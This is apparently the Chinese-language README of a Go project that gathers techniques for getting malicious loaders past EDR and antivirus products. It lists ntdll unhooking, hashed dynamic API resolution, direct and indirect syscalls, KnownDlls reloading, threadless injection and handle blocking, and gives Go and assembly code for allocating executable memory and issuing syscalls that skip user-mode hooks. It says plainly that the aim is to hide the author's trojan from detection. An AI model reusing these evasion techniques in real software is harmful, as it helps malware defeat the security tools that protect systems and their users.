![https://socialify.git.ci/qi4L/GoLangUnhooker/image?description=1&font=KoHo&forks=1&issues=1&language=1&logo=https%3A%2F%2Fs11.ax1x.com%2F2024%2F01%2F11%2FpF97rkT.png&name=1&owner=1&pattern=Charlie%20Brown&pulls=1&stargazers=1&theme=Auto]()

# ✅磁盘覆盖脱钩
假设Ntdll已经被挂钩, 取消挂钩 DLL 的过程如下：
1. 将 ntdll.dll 的新副本从磁盘映射到进程内存
2. 查找挂钩的 ntdll.dll 的 .text 部分的虚拟地址
   - 获取 ntdll.dll 基地址
   - 模块基址 + 模块的 .text 部分 VirtualAddress
3. 查找新映射的 ntdll.dll 的 .text 部分的虚拟地址
4. 获取挂钩模块的 .text 部分的原始内存保护
5. 将 .text 部分从新映射的 dll 复制到原始（挂钩的）ntdll.dll 的虚拟地址（在第 3 步中找到）——这是取消挂钩的主要部分，因为所有挂钩的字节都被磁盘中的新字节覆盖
6. 将原始内存保护应用到原始 ntdll.dll 的刚脱钩的 .text 部分

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownasdasNU1rdfsa.png)

这个方法理论上可以应用于其他dll。

# ✅Threadless Process Injection

来自 BsidesCymru 2023 演讲 [Needles Without the Thread](https://pretalx.com/bsides-cymru-2023-2022/talk/BNC8W3/)。

# ✅动态API解析

如果使用IDA或者x64debug之类的工具看自己编写的马，很容易发现，不论是API函数还是DLL，很轻松就可以找到。

那么就可以使用一些算法来让API函数与DLL，不是明文的出现在代码中（这里推荐 djb2）。

其次通过`GetProcAddress`的方式，来获取函数地址，然后指向函数指针，以这种方法可以规避一定的EDR产品。

我并没有归纳所有调用方式，但会给出一个示例：

```go
dll1 = djb2md5.API(dll1)
funcAdd = djb2md5.API(funcAdd)
hNtdll, err1 := syscall.LoadLibrary(dll1)
if err1 != nil {
  log.Fatal(err1, " LoadLibrary")
}
ret, err2 := syscall.GetProcAddress(hNtdll, funcAdd)
if err2 != nil {
  log.Fatal(err2, " GetProcAddress")
}
addr, _, _ = syscall.SyscallN(GetProcAddressHash("6967162730562302977", "5569890453920123629"), uintptr(0), uintptr(len(pp1)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
```

# ✅直接系统调用

在最新的CS4.8也集成了这种调用方式，但那是开箱即用的，这很不好，对于杀软方很容易就可以打标。

且大多数 EDR 产品将在用户态下挂钩 win32 api 调用。

这里给出泛用的GO汇编示例：

from GO
```plan9_x86
// func Syscall(callid uint16, argh ...uintptr) (uint32, error, error)
TEXT	·WinApiSyscall(SB),NOSPLIT,$168-64
	NO_LOCAL_POINTERS
	CALL	runtime·entersyscall<ABIInternal>(SB)
	MOVQ	trap+0(FP), BP	// syscall entry
	// copy args down
	LEAQ	a1+8(FP), SI
	LEAQ	sysargs-160(SP), DI
	CLD
	MOVSQ
	MOVSQ
	MOVSQ
	SYSCALL
	MOVQ	AX, r1+32(FP)
	MOVQ	$0, r2+40(FP)
	CMPL	AX, $-1
	JNE	ok3

	LEAQ	errbuf-128(SP), AX
	MOVQ	AX, sysargs-160(SP)
	MOVQ	$128, sysargs1-152(SP)
	MOVQ	$SYS_ERRSTR, BP
	SYSCALL
	CALL	runtime·exitsyscall(SB)
	MOVQ	sysargs-160(SP), AX
	MOVQ	AX, errbuf-168(SP)
	CALL	runtime·gostring(SB)
	LEAQ	str-160(SP), SI
	JMP	copyresult3

ok3:         // 返回值
	CALL	runtime·exitsyscall(SB)
	LEAQ	·emptystring(SB), SI

copyresult3: // 错误
	LEAQ	err+48(FP), DI

	CLD
	MOVSQ
	MOVSQ

	RET
```

from ScareCrow
```plan9_x86
TEXT ·Allocate(SB),$0-56
		XORQ AX,AX
        MOVW callid+0(FP), AX
        MOVQ PHandle+8(FP), CX 
        MOVQ SP, DX 
        ADDQ $0x48, DX
        MOVQ $0,(DX)
        MOVQ ZeroBits+35(FP), R8
        MOVQ SP, R9 
        ADDQ $40, R9
        ADDQ $8,SP
        MOVQ CX,R10
        SYSCALL
        SUBQ $8,SP
        RET

//Shout out to C-Sto for helping me solve the issue of  ... alot of this also based on https://golang.org/src/runtime/sys_windows_amd64.s
#define maxargs 8
//func Syscall(callid uint16, argh ...uintptr) (uint32, error)
TEXT ·NtProtectVirtualMemory(SB), $0-56
	XORQ AX,AX
	MOVW callid+0(FP), AX
	PUSHQ CX
	MOVQ argh_len+16(FP),CX
	MOVQ argh_base+8(FP),SI
	MOVQ	0x30(GS), DI
	MOVL	$0, 0x68(DI)
	SUBQ	$(maxargs*8), SP
	MOVQ	SP, DI
	CLD
	REP; MOVSQ
	MOVQ	SP, SI
	SUBQ	$8, SP
	MOVQ	0(SI), CX
	MOVQ	8(SI), DX
	MOVQ	16(SI), R8
	MOVQ	24(SI), R9
	MOVQ	CX, X0
	MOVQ	DX, X1
	MOVQ	R8, X2
	MOVQ	R9, X3
	MOVQ CX, R10
	SYSCALL
	ADDQ	$((maxargs+1)*8), SP
	POPQ	CX
	MOVL	AX, errcode+32(FP)
	MOVQ	0x30(GS), DI
	MOVL	0x68(DI), AX
	MOVQ	AX, err_itable+40(FP)
	RET
```

缺点：汇编代码在 Windows 操作系统版本之间的某些点上是不同的，有时甚至在服务包/内置编号之间也是不同的。

# ✅间接系统调用

通过函数地址 + syscall.SyscallN的方式来调用API，就是间接系统调用。

# ✅Patch Inline Hooking

通过应用正确的函数调用，重新钩住被钩住的函数。

这个方法理论上可以应用于其他函数。

# ❌Export Address Table (EAT)

间接调用通常是结合使用 GetModuleHandle 和 GetProcAddress来解析系统调用的地址。另一种方式是在进程环境块（PEB）中手动定位NTDLL.dll，通过解析导出地址表（EAT）找到系统调用。

如果使用内存中已有的 NTDLL 基地址，这将不会绕过任何系统调用的 UM 挂钩。但是GO是不会自己把dll加载进去的，所以有效，但是要记得去卸载DLL。

# ❌Dual-load 1 (Section)

`KnownDlls`是对象命名空间中的一个目录，其中包含进程加载的最常见 DLL 的部分对象。

存储在注册表`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`下。

它通过减少可执行文件的加载时间来提高性能，并且可以通过打开节名`\KnownDlls\ntdll.dll`将 NTDLL 的新副本映射到进程中。

重新加载之后，我们就相当于获取了一个未被hook的ntdll对象，就可以使用其中的syscall方法了。

有些产品不会挂钩 NtMapViewOfSectionEx，但这仅在 Windows 10 1803 之后可用。
上面的代码把NtMapViewOfSection换成NtMapViewOfSectionEx。

# ✅NativePayload

一个简单的思路，延时 + RWX 更改为 X 或 RX ，[来源](https://www.linkedin.com/pulse/2-simple-c-techniques-bypassing-anti-virus-damon-mohammadbagher/)。

# ✅未公开的API

逆向DLL中的未公开的API，只要序列号没有函数名的，然后直接系统调用传参即可。
这样的API很可能不在EDR的名单上可以过。

缺点：效果好成本也大，且实战环境多样，在win10 dll中找到的未公开API，win7 和 windows servse中很可能无。

# ✅BlockOpenHandle

阻止任何进程打开你的进程的句柄，只允许 SYTEM 打开你的进程的句柄，这样就可以避免远程内存扫描器

# 🦚unhook库

推一个[unhook库](https://pkg.go.dev/github.com/timwhitez/Doge-Gabh/pkg/Gabh)，看函数名就知道集成了些unhook技巧。
可以从磁盘或者内存中加载函数，但是系统调用自己去定义，他只定义了一部分系统调用，所有调用有些函数时候就会出现莫名其妙的错误。

# 🦜TODO

+ 更新更多的EDR绕过技术;

# 参考

+ https://roberreigada.github.io/posts/playing_with_an_edr/;
+ https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/;
+ https://github.com/am0nsec/HellsGate;
+ https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/;
+ https://ethicalchaos.dev/2020/06/14/lets-create-an-edr-and-bypass-it-part-2/;
+ https://thewover.github.io/Dynamic-Invoke/;
+ https://j00ru.vexillium.org/syscalls/nt/64/;
+ https://0xdarkvortex.dev/hiding-in-plainsight/
+ https://github.com/TheD1rkMtr/BlockOpenHandle
